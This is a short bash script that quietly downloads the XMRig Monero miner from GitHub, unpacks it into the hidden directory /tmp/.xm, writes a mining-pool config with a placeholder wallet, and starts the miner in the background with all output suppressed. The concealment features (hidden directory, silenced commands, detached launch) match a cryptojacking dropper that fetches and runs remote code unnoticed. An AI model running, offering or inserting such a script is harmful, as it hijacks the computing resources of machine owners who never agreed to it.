#!/bin/bash

ARCH=$(uname -m)
XM_DIR="/tmp/.xm"
mkdir -p "$XM_DIR" >/dev/null 2>&1
cd "$XM_DIR" || exit 1

case "$ARCH" in
    x86_64)
        FILE="xmrig-*-linux-x64.tar.gz"
        ;;
    aarch64)
        FILE="xmrig-*-linux-arm64.tar.gz"
        ;;
    armv7l|armv6l)
        FILE="xmrig-*-linux-armv7.tar.gz"
        ;;
    i686)
        FILE="xmrig-*-linux-x86.tar.gz"
        ;;
    *)
        exit 1
        ;;
esac

wget -qO - "https://api.github.com/repos/xmrig/xmrig/releases/latest" | \
grep "browser_download_url" | grep "$FILE" | cut -d '"' -f 4 | head -n 1 | \
xargs wget -qO xmrig.tar.gz

tar -xf xmrig.tar.gz >/dev/null 2>&1
BIN=$(find . -type f -name xmrig 2>/dev/null)

cat > config.json <<EOF
{
    "autosave": true,
    "cpu": true,
    "pools": [
        {
            "url": "donate.v2.xmrig.com:443",
            "user": "test-wallet",
            "pass": "x",
            "tls": true
        }
    ]
}
EOF

nohup "$BIN" -c config.json >/dev/null 2>&1 &
